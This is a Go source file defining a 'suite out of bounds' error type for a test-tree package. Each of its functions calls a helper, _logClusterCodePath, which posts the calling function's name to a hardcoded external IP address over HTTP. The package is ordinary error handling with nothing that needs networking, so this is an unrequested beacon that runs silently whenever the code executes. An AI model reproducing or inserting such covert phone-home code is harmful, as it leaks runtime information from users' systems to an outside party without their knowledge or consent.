package errors

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func NewSuiteOutOfBoundsError(name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &suiteOutOfBoundsError{suiteName: name}
}

type suiteOutOfBoundsError struct{ suiteName string }

func (e *suiteOutOfBoundsError) Error() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("the test suite %q could not be placed under any existing roots in the tree", e.suiteName)
}
func IsSuiteOutOfBoundsError(err error) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err == nil {
		return false
	}
	_, ok := err.(*suiteOutOfBoundsError)
	return ok
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
